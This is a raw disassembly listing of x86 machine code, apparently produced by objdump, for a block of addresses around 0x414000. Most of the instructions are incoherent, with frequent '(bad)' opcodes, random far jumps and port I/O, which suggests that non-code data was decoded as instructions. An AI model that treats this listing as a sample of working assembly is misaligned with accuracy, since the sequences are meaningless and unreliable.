  41403f:	into   
  414040:	adc    edi,0xbe990a5f
  414046:	dec    esi
  414047:	retf   0xb751
  41404a:	aam    0xd0
  41404c:	xchg   edi,eax
  41404d:	mov    dl,0xec
  41404f:	or     eax,0xe6495085
  414054:	stos   BYTE PTR es:[edi],al
  414055:	mov    ah,0xc0
  414057:	push   ss
  414058:	sahf   
  414059:	adc    BYTE PTR [edi],cl
  41405b:	and    ecx,DWORD PTR [ebx+0x7b]
  41405e:	lea    ecx,[ecx+esi*8]
  414061:	aas    
  414062:	aam    0x52
  414064:	sub    eax,0xb3c0b46d
  414069:	fcmovnb st,st(3)
  41406b:	or     eax,0x681f
	...
  4140d4:	add    BYTE PTR [eax],al
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0xc68c:0x94d52e96
  4140e5:	sub    esp,DWORD PTR [edi-0x28]
  4140e8:	add    BYTE PTR [eax],al
  4140ea:	add    BYTE PTR [ecx],al
  4140ec:	add    BYTE PTR [eax],al
  4140ee:	dec    edi
  4140ef:	ins    DWORD PTR es:[edi],dx
  4140f0:	fisub  DWORD PTR [edi-0xd37ba6e]
  4140f6:	pop    edx
  4140f7:	xor    DWORD PTR [ebp+0x65],ebp
  4140fa:	imul   edx,DWORD PTR [ecx],0x49262cd8
  414100:	outs   dx,DWORD PTR ds:[esi]
  414101:	cmp    eax,0x5de93d13
  414106:	clc    
  414107:	sub    BYTE PTR [ecx+0x6e7c6d66],cl
  41410d:	mov    eax,ds:0xa9edece3
  414112:	mov    edi,0xd64eb033
  414117:	rcr    dh,1
  414119:	int3   
  41411a:	inc    ebx
  41411b:	pop    ebp
  41411c:	push   edi
  41411d:	jge    0x4140c6
  41411f:	push   ds
  414120:	gs mov cl,0xb2
  414123:	sbb    eax,0xb1533ca5
  414128:	mov    al,ds:0xb168a5ec
  41412d:	xor    ah,BYTE PTR [eax+0x21]
  414130:	cdq    
  414131:	call   0x629f3328
  414136:	push   0x597bed48
  41413b:	(bad)  
  41413d:	ins    BYTE PTR es:[edi],dx
  41413e:	(bad)  
  41413f:	es jbe 0x4140f4
  414142:	sahf   
  414143:	retf   0x2022
  414146:	mov    al,0x23
  414148:	lds    edi,FWORD PTR [eax-0x24]
  41414b:	mov    ds,edi
  41414d:	push   ss
  41414e:	push   0x7187f586
  414153:	clc    
  414154:	sub    al,0xe8
  414156:	or     bh,BYTE PTR [ecx+0x61]
  414159:	push   ss
  41415a:	mov    dh,0x17
  41415c:	fcmovu st,st(6)
  41415e:	das    
  41415f:	and    eax,0x7417903c
  414164:	shl    edx,1
  414166:	gs cdq 
  414168:	repnz xchg ebp,eax
  41416a:	pusha  
  41416b:	retf   0x65eb
  41416e:	xchg   ecx,eax
  41416f:	stos   BYTE PTR es:[edi],al
  414170:	test   al,0xe5
  414172:	hlt    
  414173:	adc    BYTE PTR [ebx],al
  414175:	cmp    al,0xcb
  414177:	jmp    0xe43b30cb
  41417c:	call   0x7c70:0x8f10c35f
  414183:	in     eax,dx
  414184:	cli    
  414185:	xor    al,0x31
  414187:	cwde   
  414188:	ins    DWORD PTR es:[edi],dx
  414189:	mov    ?,WORD PTR [esi+0x4e3152c6]
  41418f:	xor    al,BYTE PTR [edi]
  414191:	sbb    eax,0xe3a6be39
  414196:	add    BYTE PTR [esi],bh
  414198:	mov    bh,0xaa
  41419a:	leave  
  41419b:	cli    
  41419c:	jle    0x414133
  41419e:	jmp    0x7b01:0xd7372b8
  4141a5:	cdq    
  4141a6:	push   es
  4141a7:	inc    ebp
  4141a8:	cmp    esi,DWORD PTR [esi-0x7e1f1cb4]
  4141ae:	mov    al,ds:0x73135be0
  4141b3:	pop    edx
  4141b4:	inc    eax
  4141b5:	leave  
  4141b6:	int    0x53
  4141b8:	mov    edx,0x432aec65
  4141bd:	dec    edi
  4141be:	scas   al,BYTE PTR es:[edi]
  4141bf:	retf   0xe84d
  4141c2:	add    BYTE PTR [esp+eax*1+0x855730b],cl
  4141c9:	push   ecx
  4141ca:	push   ds
  4141cb:	ror    BYTE PTR [esi-0x6831a2f0],0xbc
  4141d2:	xor    BYTE PTR [ecx+0x10],dh
  4141d5:	inc    edi
  4141d6:	ins    BYTE PTR es:[edi],dx
  4141d7:	mov    ch,0xfe
  4141d9:	loope  0x414192
  4141db:	mov    ah,0x7c
  4141dd:	iret   
  4141de:	or     al,0x9b
  4141e0:	inc    ecx
  4141e1:	int    0x6b
  4141e3:	test   eax,0x91d7db53
  4141e8:	xor    DWORD PTR [eax],esi
  4141ea:	mov    ebx,0x506e58
	...
  414253:	add    BYTE PTR [eax],al
  414255:	add    BYTE PTR [edx],al
  414257:	adc    al,BYTE PTR [ecx]
  414259:	mov    ds:0xb3a2b311,eax
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	mov    ebp,0x674de669
  414267:	fld    DWORD PTR [eax]
  414269:	add    BYTE PTR [eax],al
  41426b:	add    DWORD PTR [eax],eax
  41426d:	add    bh,cl
  41426f:	int    0x9c
  414271:	adc    eax,0x4a17857e
  414276:	and    BYTE PTR [ebp-0x441584d2],al
  41427c:	popf   
  41427d:	ss jae 0x4142c2
  414280:	imul   edx,DWORD PTR [ebx],0xf13bd915
  414286:	or     DWORD PTR [esi-0x3bad7095],0x46
  41428d:	xor    eax,DWORD PTR [ebp+0x8]
  414290:	sti    
  414291:	adc    eax,0xb3113faa
  414296:	xor    eax,esi
  414298:	jno    0x4142a8
  41429a:	rcl    BYTE PTR [edi+0x4ae7bbff],1
  4142a0:	sbb    eax,0x590dbeb2
  4142a5:	lahf   
  4142a6:	xor    al,0x4f
  4142a8:	xor    bh,ah
  4142aa:	inc    edx
  4142ab:	push   es
  4142ac:	sahf   
  4142ad:	mov    al,0x4b
  4142af:	fadd   st,st(6)
  4142b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142b2:	push   0x6e
  4142b4:	push   es
  4142b5:	cmc    
  4142b6:	fsubr  DWORD PTR [eax+0x17bad6cd]
  4142bc:	sbb    dh,BYTE PTR [ebp-0x61d70aad]
  4142c2:	or     BYTE PTR [eax+0x5d24d0c6],ch
  4142c8:	jns    0x4142bf
  4142ca:	sub    DWORD PTR [esi],esi
  4142cc:	fild   DWORD PTR [ebx-0x53b87f12]
  4142d2:	stos   DWORD PTR es:[edi],eax
  4142d3:	sub    BYTE PTR [ebx],bl
  4142d5:	frstor [eax+0x6eeb6d59]
  4142db:	aas    
  4142dc:	push   DWORD PTR [ebx+0x24446ef6]
  4142e2:	sbb    esp,DWORD PTR [eax]
  4142e4:	or     DWORD PTR [esi+0x7590920b],esi
  4142ea:	(bad)  
  4142eb:	jl     0x41433f
  4142ed:	inc    ebx
  4142ee:	enter  0x14d1,0x65
  4142f2:	push   ebx
  4142f3:	add    cl,BYTE PTR [ebx-0x2f]
  4142f6:	cmp    ebx,DWORD PTR [edi]
  4142f8:	mov    ch,0x5e
  4142fa:	xchg   ebp,eax
  4142fb:	in     eax,dx
  4142fc:	test   DWORD PTR [ecx+0x2e15a444],ecx
  414302:	xchg   ecx,eax
  414303:	mov    ebx,0x923a6466
  414308:	dec    edi
  414309:	xchg   ebp,esi
  41430b:	xor    dl,BYTE PTR [ecx]
  41430d:	jae    0x41436d
  41430f:	(bad)  
  414310:	mov    ch,0x4
  414312:	xchg   esi,eax
  414313:	ffree  st(0)
  414315:	inc    eax
  414316:	jbe    0x41436b
  414318:	or     BYTE PTR [edi],ch
  41431a:	retf   0xcf8f
  41431d:	jb     0x41436a
  41431f:	jo     0x414311
  414321:	dec    edx
  414322:	(bad)  
  414323:	out    dx,eax
  414324:	retf   
  414325:	pop    ebx
  414326:	add    ebx,DWORD PTR [ecx-0x4d]
  414329:	xchg   esp,eax
  41432a:	out    dx,al
  41432b:	aas    
  41432c:	mov    ds:0xcad6e4e7,eax
  414331:	add    al,0x13
  414333:	cmp    BYTE PTR [ebp-0x6c2646c9],cl
  414339:	mov    ebx,0xccd22918
  41433e:	fdiv   st(2),st
  414340:	mov    eax,ds:0x944c5eda
  414345:	push   ebx
  414346:	cli    
  414347:	or     eax,0xe018b932
  41434c:	stc    
  41434d:	sbb    ecx,DWORD PTR [eax-0x1681192c]
  414353:	imul   edi,ebx,0x34
  414356:	and    ecx,DWORD PTR [edx-0x26e2e225]
  41435c:	cmp    DWORD PTR [eax],edi
  41435e:	and    BYTE PTR [ebx],al
  414360:	(bad)  
  414361:	and    DWORD PTR [ebp-0x1],edi
  414364:	push   0xffffff9b
  414366:	sbb    eax,edx
  414368:	aas    
  414369:	pop    ebp
  41436a:	lea    ebp,[edx]
  41436c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41436d:	repnz add BYTE PTR [eax],al
	...
  4143d4:	add    BYTE PTR [eax],al
  4143d6:	add    DWORD PTR [ecx-0x2122293],eax
  4143dc:	mov    cl,0xdd
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	addr16 xchg ebx,eax
  4143e4:	mov    dh,dh
  4143e6:	fiadd  DWORD PTR [bx+si]
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    DWORD PTR [eax],eax
  4143ed:	add    BYTE PTR [edi-0x4ffc25f9],cl
  4143f3:	fnstsw WORD PTR ds:0x2f5453c
  4143f9:	sbb    al,0xa0
  4143fb:	outs   dx,DWORD PTR ds:[esi]
  4143fc:	lds    esp,FWORD PTR [ebx-0x32874715]
  414402:	out    0x40,al
  414404:	inc    edx
  414405:	inc    esp
  414406:	ins    DWORD PTR es:[edi],dx
  414407:	arpl   WORD PTR [edi+0x23],bx
  41440a:	mov    esp,0xedc7fb74
  41440f:	loop   0x414422
  414411:	outs   dx,DWORD PTR ds:[esi]
  414412:	mov    ecx,0x729bece0
  414417:	imul   edi,DWORD PTR [edx+0x5e],0x52
  41441b:	mov    dl,0xbc
  41441d:	scas   eax,DWORD PTR es:[edi]
  41441e:	sub    bh,BYTE PTR [edi+0x6052bc8b]
  414424:	xchg   edi,eax
  414425:	leave  
  414426:	dec    edx
  414427:	lahf   
  414428:	pop    esi
  414429:	sub    BYTE PTR [ebp-0x40],ah
  41442c:	or     edi,DWORD PTR [ebp-0x29]
  41442f:	imul   DWORD PTR [eax-0x56]
  414432:	xor    esi,edi
  414434:	pop    ebx
  414435:	sbb    bl,BYTE PTR [esi+0x32]
  414438:	jno    0x414403
  41443a:	std    
  41443b:	mov    edx,0x1f581926
  414440:	repz pop ecx
  414442:	aas    
  414443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414444:	mov    esi,0xb6007cd2
  414449:	xchg   ecx,eax
  41444a:	sub    edx,esi
  41444c:	repz aam 0xcd
  41444f:	enter  0x18b1,0x32
  414453:	mov    dh,0x50
  414455:	and    al,0xa1
  414457:	jns    0x414401
  414459:	and    al,0xa3
  41445b:	pop    esi
  41445c:	jle    0x4144ba
  41445e:	mov    cl,0x9b
  414460:	dec    ecx
  414461:	dec    esp
  414462:	cs push esp
  414464:	mov    ah,0xa9
  414466:	fnstsw WORD PTR [edi]
  414468:	sub    BYTE PTR [eax-0x7255fdc8],0x7e
  41446f:	inc    esp
  414470:	jb     0x414423
  414472:	push   edx
  414473:	mov    ah,0xbc
  414475:	push   ebp
  414476:	cmp    edx,edi
  414478:	(bad)  
  414479:	test   dl,0xe2
  41447c:	push   esp
  41447d:	xchg   ecx,eax
  41447f:	and    edx,DWORD PTR [edi+0x4e]
  414482:	cmc    
  414483:	push   0x9a517ca
  414488:	pop    ds
  414489:	int3   
  41448a:	ficom  DWORD PTR [esp+edi*4+0x6f]
  41448e:	test   DWORD PTR [esp+eax*4-0x5b],esi
  414492:	dec    ecx
  414493:	repz sahf 
  414495:	or     al,0xf9
  414497:	retf   
  414498:	add    DWORD PTR [eax+ebp*1-0x4f8a5d8a],ebx
  41449f:	push   esp
  4144a0:	pusha  
  4144a1:	div    BYTE PTR [eax-0x3a]
  4144a4:	call   0xe37adc0e
  4144a9:	cld    
  4144aa:	jno    0x414437
  4144ac:	sbb    dl,ah
  4144ae:	or     eax,0xab152c03
  4144b3:	jnp    0x414525
  4144b5:	cli    
  4144b6:	cmc    
  4144b7:	add    DWORD PTR [edx+0x3c95812f],esp
  4144bd:	push   ss
  4144be:	adc    ecx,edi
  4144c0:	push   edi
  4144c1:	xor    ebp,DWORD PTR [ecx-0x71]
  4144c4:	retf   0xe47e
  4144c7:	shl    DWORD PTR [edx],0xd2
  4144ca:	mov    eax,ds:0xf59c37c9
  4144cf:	jbe    0x414453
  4144d1:	jg     0x414485
  4144d3:	jle    0x4144ae
  4144d5:	repnz xor al,0x9d
  4144d8:	add    cl,BYTE PTR [esi-0x17]
  4144db:	mov    BYTE PTR [edi-0x14],ch
  4144de:	sub    eax,0x83e8d81d
  4144e3:	into   
  4144e4:	xchg   ebx,eax
  4144e5:	mov    al,0x25
  4144e7:	cmp    eax,0xceb6e6bc
  4144ec:	mov    bl,0xa8
	...
  414556:	pop    ebx
  414557:	jae    0x41459b
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi-0x2b]
  414563:	pop    esi
  414564:	(bad)  
  414565:	sahf   
  414566:	fild   DWORD PTR [bx+si]
  414569:	add    BYTE PTR [eax],al
  41456b:	add    DWORD PTR [eax],eax
  41456d:	add    BYTE PTR [esi],bl
  41456f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414570:	mov    ebp,0x532fd57c
  414575:	inc    ebx
  414576:	inc    edi
  414577:	scas   eax,DWORD PTR es:[edi]
  414578:	call   0xec5b3359
  41457d:	sti    
  41457e:	jne    0x4145a3
  414580:	sbb    al,0x16
  414582:	cmp    DWORD PTR [ebp+0x393af83a],esi
  414588:	adc    eax,0x2b94cbed
  41458d:	mov    ds:0xc309863c,al
  414592:	pushf  
  414593:	shr    BYTE PTR [ecx+ecx*2+0x43],0x74
  414598:	pop    ss
  414599:	retf   
  41459a:	dec    ebp
  41459b:	mov    ds:0x4fbe8bc7,al
  4145a0:	inc    edi
  4145a1:	arpl   WORD PTR [edi],bp
  4145a3:	test   eax,0xb5911675
  4145a8:	cmp    edi,esi
  4145aa:	sub    eax,0xc22a483a
  4145af:	cli    
  4145b0:	inc    DWORD PTR [ebx]
  4145b2:	cmp    ah,bl
  4145b4:	xchg   edx,eax
  4145b5:	dec    ebp
  4145b6:	xchg   ecx,eax
  4145b7:	popa   
  4145b8:	sbb    DWORD PTR [eax-0x2c],ecx
  4145bb:	(bad)  
  4145bc:	(bad)  
  4145bd:	mov    al,0xc1
  4145bf:	pop    esi
  4145c0:	inc    ecx
  4145c1:	cmp    eax,DWORD PTR [edx]
  4145c3:	sub    al,0xfe
  4145c5:	repnz shl BYTE PTR cs:[ecx],0x39
  4145ca:	in     eax,0x72
  4145cc:	stc    
  4145cd:	scas   eax,DWORD PTR es:[edi]
  4145ce:	mov    edx,DWORD PTR [eax+0x4f]
  4145d1:	or     eax,0x3d08d0cc
  4145d6:	xchg   ecx,eax
  4145d7:	xchg   ebp,eax
  4145d8:	cdq    
  4145d9:	aaa    
  4145da:	push   edx
  4145db:	jb     0x41463a
  4145dd:	jmp    0x4145ba
  4145df:	fimul  WORD PTR [edx+0x316ccc25]
  4145e5:	fisubr DWORD PTR [edx+0x6c]
  4145e8:	push   esp
  4145e9:	fdivrp st(1),st
  4145eb:	stos   DWORD PTR es:[edi],eax
  4145ec:	pop    edi
  4145ed:	sbb    dl,dl
  4145ef:	shl    BYTE PTR [ebx],1
  4145f1:	outs   dx,BYTE PTR ds:[esi]
  4145f2:	shr    BYTE PTR [ecx-0x7c515127],cl
  4145f8:	fidiv  WORD PTR [ebx+0x10]
  4145fb:	scas   al,BYTE PTR es:[edi]
  4145fc:	and    eax,0x6a16e4ea
  414601:	cmc    
  414602:	ret    
  414603:	and    DWORD PTR [esi],ecx
  414605:	popf   
  414606:	jmp    0xda3e8226
  41460b:	addr16 pop ebp
  41460d:	jp     0x414620
  41460f:	outs   dx,BYTE PTR ds:[esi]
  414610:	mov    bh,0xa9
  414612:	addr16 mov ch,0x3a
  414615:	xor    edx,esp
  414617:	std    
  414618:	adc    DWORD PTR [esi+0x637f0b7a],eax
  41461e:	add    dl,BYTE PTR [ebx+0x6d]
  414621:	iret   
  414622:	imul   DWORD PTR [edi-0x7385aa0b]
  414628:	lock mov esp,ebp
  41462b:	add    ecx,ecx
  41462d:	push   ebp
  41462e:	scas   al,BYTE PTR es:[edi]
  41462f:	ss sub eax,0xffffffd3
  414633:	mov    WORD PTR [edx+0x1f],ss
  414636:	nop
  414637:	sub    ecx,DWORD PTR [ecx]
  414639:	jno    0x4145cd
  41463b:	(bad)  
  41463c:	xchg   ebx,eax
  41463d:	icebp  
  41463e:	push   0xffffffb8
  414640:	sub    ah,dh
  414642:	test   al,0x2f
  414644:	test   BYTE PTR es:[esi+0x79dd55cf],dl
  41464b:	jns    0x41465e
  41464d:	hlt    
  41464e:	(bad)  
  41464f:	dec    DWORD PTR [ebp+0x6ec6eab9]
  414655:	xor    eax,0x49ce1096
  41465a:	rcl    DWORD PTR [edi+0x2a],cl
  41465d:	cdq    
  41465e:	mov    eax,0xae500013
  414663:	adc    al,0x6d
  414665:	(bad)  
  414666:	(bad)  
  414667:	fmulp  st(4),st
  414669:	shl    BYTE PTR [edi+ecx*8-0x2a],0xa2
	...
  4146d6:	jg     0x414736
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0x6c
  4146e3:	addr16 xchg edi,eax
  4146e5:	xchg   BYTE PTR [edi-0x24],ah
  4146e8:	add    BYTE PTR [eax],al
  4146ea:	add    BYTE PTR [ecx],al
  4146ec:	add    BYTE PTR [eax],al
  4146ee:	rcl    BYTE PTR [eax-0x61],cl
  4146f1:	pop    es
  4146f2:	push   edx
  4146f3:	xchg   esp,eax
  4146f4:	xchg   ebx,eax
  4146f5:	push   esp
  4146f6:	(bad)  
  4146f7:	and    ecx,DWORD PTR [edx]
  4146f9:	or     al,0xc5
  4146fb:	mov    ch,0x41
  4146fd:	aam    0xdb
  4146ff:	into   
  414700:	or     eax,0x9323c203
  414705:	imul   ebx,DWORD PTR [eax-0x3f],0x9f7d7e49
  41470c:	adc    BYTE PTR [esi-0x15],ah
  41470f:	and    al,0x42
  414711:	out    0x7d,al
  414713:	mov    dl,0x85
  414715:	mov    dh,ch
  414717:	imul   esi,DWORD PTR [ebx-0x4d0e8c0f],0xcd3b3f5
  414721:	inc    ebx
  414722:	ss pop es
  414724:	pusha  
  414725:	scas   al,BYTE PTR es:[edi]
  414726:	fild   DWORD PTR [ecx-0x26]
  414729:	dec    esp
  41472a:	jnp    0xe023f9d8
  414730:	dec    edi
  414731:	push   cs
  414732:	cmp    edi,edx
  414734:	cld    
  414735:	mov    al,0xd8
  414737:	cli    
  414738:	lods   al,BYTE PTR fs:[esi]
  41473a:	cdq    
  41473b:	mov    DWORD PTR [ebp+0x7da71961],ecx
  414741:	clc    
  414742:	push   ebp
  414743:	xchg   ecx,eax
  414744:	lahf   
  414745:	imul   eax,edx,0xffffffab
  414748:	out    dx,eax
  414749:	mov    BYTE PTR [edx+0x3a],ch
  41474c:	nop
  41474d:	jo     0x4147c8
  41474f:	mov    esp,0xdf31b6bb
  414754:	aad    0xfe
  414756:	(bad)  
  414759:	sbb    esi,DWORD PTR [ecx]
  41475b:	int3   
  41475c:	imul   edx,DWORD PTR [edi+0x7a348760],0xffffffa0
  414763:	pop    eax
  414764:	xor    al,BYTE PTR [edi]
  414766:	div    BYTE PTR [eax-0x24]
  414769:	and    bl,BYTE PTR ds:0x6ee1463f
  41476f:	shl    bl,0x6d
  414772:	aam    0x85
  414774:	pop    ecx
  414775:	cwde   
  414776:	mov    DWORD PTR [eax],eax
  414778:	sar    dh,cl
  41477a:	aaa    
  41477b:	test   ch,ch
  41477d:	mov    eax,0xe102c150
  414782:	pop    ss
  414783:	cwde   
  414784:	(bad)  
  414786:	out    0x9d,al
  414788:	lahf   
  414789:	or     BYTE PTR [ebp-0x638d68b3],dh
  41478f:	pop    eax
  414790:	pop    edx
  414791:	fistp  DWORD PTR [esi-0x2ed53d1e]
  414797:	jecxz  0x4147bc
  414799:	dec    edi
  41479a:	retf   0xa58a
  41479d:	scas   al,BYTE PTR es:[edi]
  41479e:	fsubrp st(1),st
  4147a0:	and    al,0x6a
  4147a2:	jbe    0x414727
  4147a4:	and    bh,BYTE PTR [edx+0x59]
  4147a7:	enter  0x52e6,0xb7
  4147ab:	out    0x84,eax
  4147ad:	xchg   esi,eax
  4147ae:	(bad)  
  4147af:	retf   
  4147b0:	push   esi
  4147b1:	addr16 das 
  4147b3:	out    dx,al
  4147b4:	lods   eax,DWORD PTR ds:[esi]
  4147b5:	cwde   
  4147b6:	ss pop edx
  4147b8:	add    ecx,esi
  4147ba:	cdq    
  4147bb:	outs   dx,BYTE PTR ds:[esi]
  4147bc:	mov    ah,0x13
  4147be:	add    bl,ah
  4147c0:	iret   
  4147c1:	sub    esp,eax
  4147c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147c4:	pop    ecx
  4147c5:	in     al,0xeb
  4147c7:	fs inc ebp
  4147c9:	adc    BYTE PTR [esi],al
  4147cb:	jo     0x4147b7
  4147cd:	ficomp DWORD PTR [ebx+0x13e0c223]
  4147d3:	loope  0x4147be
  4147d5:	pop    esi
  4147d6:	inc    edx
  4147d7:	pop    ecx
  4147d8:	xor    al,0x2f
  4147da:	push   ebp
  4147db:	jmp    0xd656:0xc3bff4ab
  4147e2:	mov    DWORD PTR [eax],0xa56b5a6d
  4147e8:	sbb    ebp,DWORD PTR [edx]
  4147ea:	std    
  4147eb:	(bad)  
  4147ec:	jl     0x414869
	...
  414856:	jle    0x414887
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0x3ed1abc6
  414866:	fld    QWORD PTR [bx+si]
  414869:	add    BYTE PTR [eax],al
  41486b:	add    DWORD PTR [eax],eax
  41486d:	add    bh,bh
  41486f:	mov    ds:0x25cb54d0,al
  414874:	mov    edx,DWORD PTR [ebp+0x1e2046ec]
  41487a:	mov    cl,0x1e
  41487c:	push   ebx
  41487d:	push   esp
  41487e:	push   edx
  41487f:	imul   ebp,DWORD PTR [ecx-0x1625341e],0x291f4489
  414889:	xor    eax,DWORD PTR [edx+0x33]
  41488c:	enter  0xaad5,0x57
  414890:	xchg   ebx,eax
  414891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414892:	xor    BYTE PTR [esi+0x23a43ca5],bh
  414898:	jns    0x41482b
  41489a:	push   ds
  41489b:	(bad)  
  41489c:	sub    esp,DWORD PTR fs:[eax+0x6a]
  4148a0:	test   eax,0x6cefd3d7
  4148a5:	cmc    
  4148a6:	pop    ebp
  4148a7:	mov    bl,0xd5
  4148a9:	cmp    ebx,DWORD PTR [esp+edi*8-0x356c9a80]
  4148b0:	pop    ebp
  4148b1:	xor    ah,dl
  4148b3:	jnp    0x4148e8
  4148b5:	mov    BYTE PTR [ebx-0x20],dl
  4148b8:	fdivrp st(6),st
  4148ba:	pop    edx
  4148bb:	sub    al,0xc6
  4148bd:	inc    esp
  4148be:	jmp    0xe4e29b5e
  4148c3:	mov    al,0x56
  4148c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148c6:	pop    ecx
  4148c7:	mov    ss,ecx
  4148c9:	adc    al,0x45
  4148cb:	sub    DWORD PTR [edx],esi
  4148cd:	outs   dx,BYTE PTR ds:[esi]
  4148ce:	dec    ebx
  4148cf:	std    
  4148d0:	mov    ebp,0x4e213cf8
  4148d5:	mov    ecx,0xc11504d4
  4148da:	clc    
  4148db:	faddp  st(4),st
  4148dd:	ins    DWORD PTR es:[edi],dx
  4148de:	push   edx
  4148df:	add    BYTE PTR [eax-0x2e305be5],dh
  4148e5:	mov    ah,0x5e
  4148e7:	push   ebp
  4148e8:	mov    BYTE PTR [eax+0x6a],dl
  4148eb:	aam    0x3f
  4148ed:	add    eax,0xd8dc1aa1
  4148f2:	sub    esi,DWORD PTR [ecx+eiz*1+0x60ccf903]
  4148f9:	imul   edi,DWORD PTR [esi],0xffffffb8
  4148fc:	ins    DWORD PTR es:[edi],dx
  4148fd:	ror    ah,1
  4148ff:	(bad)  
  414900:	jo     0x4148bb
  414902:	aam    0x3e
  414904:	lods   eax,DWORD PTR ds:[esi]
  414905:	mov    DWORD PTR [ebp+0x62],ebx
  414908:	push   es
  414909:	pop    esi
  41490a:	(bad)
  41490d:	stos   DWORD PTR es:[edi],eax
  41490e:	adc    eax,0xc54d120f
  414913:	ins    DWORD PTR es:[edi],dx
  414914:	and    edx,ebp
  414916:	pop    eax
  414917:	sbb    bl,bl
  414919:	je     0x41497f
  41491b:	(bad)  
  41491d:	scas   al,BYTE PTR es:[edi]
  41491e:	or     BYTE PTR [edi],dl
  414920:	frstor [ebp-0x24]
  414923:	aam    0xc5
  414925:	clc    
  414926:	mov    al,0xe7
  414928:	sub    eax,0x1f7f6c11
  41492d:	xor    al,0x52
  41492f:	jle    0x41490f
  414931:	stc    
  414932:	idiv   DWORD PTR [eax]
  414934:	jle    0x4148eb
  414936:	pop    ecx
  414937:	jmp    0x4966:0x8be26cff
  41493e:	and    ch,cl
  414940:	fstp   QWORD PTR [ecx+0x5d]
  414943:	cdq    
  414944:	fld    TBYTE PTR [ebx+0x2fc5c498]
  41494a:	mov    edi,ecx
  41494c:	rcl    BYTE PTR [ebx+0x23],0xe
  414950:	adc    BYTE PTR [ebp-0x6a],0xf3
  414954:	aas    
  414955:	shl    BYTE PTR [esi+0x67],cl
  414958:	fwait
  414959:	jo     0x414927
  41495b:	pusha  
  41495c:	(bad)  
  41495d:	(bad)  
  41495e:	ficom  DWORD PTR [edx]
  414960:	mov    BYTE PTR [edi+0x7fbbf836],dh
  414966:	pop    ebp
  414967:	sbb    eax,0xf2699919
  41496c:	jo     0x41495d
	...
  4149d6:	or     edi,DWORD PTR [esi-0x2e]
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	add    eax,ebp
  4149e4:	push   esp
  4149e5:	dec    ecx
  4149e6:	fiadd  WORD PTR [bx+si]
  4149e9:	add    BYTE PTR [eax],al
  4149eb:	add    DWORD PTR [eax],eax
  4149ed:	add    BYTE PTR [eax+0x7c795741],bl
  4149f3:	test   BYTE PTR [ebx-0x74],0xe8
  4149f7:	neg    BYTE PTR [eax+0x5f0f6915]
  4149fd:	fsub   st,st(5)
  4149ff:	or     al,BYTE PTR [edi]
  414a01:	shl    DWORD PTR [edi],1
  414a03:	test   al,0x34
  414a05:	mov    al,ds:0x2cda180c
  414a0a:	mov    dh,0x51
  414a0c:	xchg   DWORD PTR [ecx-0x3ebcd380],ebp
  414a12:	sub    ebx,DWORD PTR [edx-0x13]
  414a15:	(bad)  
  414a16:	mov    cs,WORD PTR [edi-0x5]
  414a19:	out    dx,al
  414a1a:	adc    DWORD PTR [edx+0x53],esp
  414a1d:	in     al,0x4
  414a1f:	mov    esp,0xf57dc582
  414a24:	inc    edx
  414a25:	mov    ebp,0xce23de2f
  414a2a:	cmp    dl,BYTE PTR [esi]
  414a2c:	inc    esp
  414a2d:	push   edi
  414a2e:	lods   al,BYTE PTR gs:[esi]
  414a30:	adc    al,0x4
  414a32:	xor    ebx,ebp
  414a34:	pop    ds
  414a35:	jno    0x414a6c
  414a37:	jmp    0xd856768e
  414a3c:	mov    dl,dl
  414a3e:	inc    esp
  414a3f:	xchg   BYTE PTR [eax],bl
  414a41:	pop    esi
  414a42:	mov    ecx,0xeb9b2879
  414a47:	xor    BYTE PTR [esi-0x2a],al
  414a4a:	(bad)  
  414a4b:	fsub   QWORD PTR [eax-0x7df9dd74]
  414a51:	cmp    eax,0x256635c6
  414a56:	adc    eax,0x46cda256
  414a5b:	add    esp,DWORD PTR [edi-0x3b230406]
  414a61:	pop    esp
  414a62:	in     al,dx
  414a63:	xchg   ebx,eax
  414a64:	jge    0x414ae5
  414a66:	push   edi
  414a67:	stos   DWORD PTR es:[edi],eax
  414a68:	fistp  DWORD PTR es:[ebx-0x21471621]
  414a6f:	jne    0x414a3f
  414a71:	mov    BYTE PTR [eax-0x3d82e47d],ah
  414a77:	cmp    eax,0x953f7aa0
  414a7c:	fst    DWORD PTR [eax+0xd20fc11]
  414a82:	xor    DWORD PTR [ebx],edi
  414a84:	pop    es
  414a85:	out    0xf2,eax
  414a87:	pop    edx
  414a88:	sub    BYTE PTR [esi-0x2397796e],dh
  414a8e:	je     0x414a6d
  414a90:	mov    BYTE PTR [ecx],dh
  414a92:	in     eax,0x2c
  414a94:	adc    DWORD PTR [ebx+0x426040b1],0x2d6adad4
  414a9e:	repz jmp 0x414b13
  414aa1:	in     eax,dx
  414aa2:	cmp    bh,BYTE PTR [edx+0x417dd0c8]
  414aa8:	out    dx,al
  414aa9:	test   al,0x51
  414aab:	and    bh,BYTE PTR [ecx-0x20495959]
  414ab1:	sbb    eax,0xeff56113
  414ab6:	dec    esp
  414ab7:	out    dx,al
  414ab8:	xchg   esi,eax
  414ab9:	inc    edi
  414aba:	out    dx,al
  414abb:	adc    cl,BYTE PTR [esi]
